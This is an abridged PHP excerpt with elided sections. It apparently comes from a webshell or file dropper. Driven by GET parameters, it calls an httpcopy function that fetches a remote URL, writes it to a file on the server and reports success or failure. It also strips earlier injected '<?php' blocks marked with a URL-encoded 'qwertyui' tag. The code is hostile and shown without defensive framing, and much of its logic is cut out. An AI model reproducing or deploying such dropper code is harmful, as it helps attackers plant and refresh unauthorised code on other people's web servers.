...
/*rewrite*/
$rew = isset($_GET['rewri'])?$_GET['rewri']:'';
/*rewrite*/
/*sitenum*/
$siteNum = isset($_GET['siteNum'])?$_GET['siteNum']:15;
/*sitenum*/
if ($ppi) {
    ...
    if (!empty($ofile)) {
        ...
        $cpRes = httpcopy($url,$fn,$efile,$ht,$rob,$rew);
        if (!empty($cpRes)) {
            echo $cpRes.'===>success';
        } else {
            echo 'fail';
...
function httpcopy($url, $file="", $efile="", $ht="",$rob="",$rew="") {
    ...
    if ($rew == 1&&!empty($eCm)&&@strstr($eCm,'%71%77%65%72%74%79%75%69')) {
    	@preg_match('/^<\?php([\s\S]+?)%71%77%65%72%74%79%75%69([\s\S]+?)\?>/',$eCm,$ematch);
    	$orStr = isset($ematch[0]) ? $ematch[0] : '';
    	$eCm = str_replace($orStr,'',$eCm);
    }
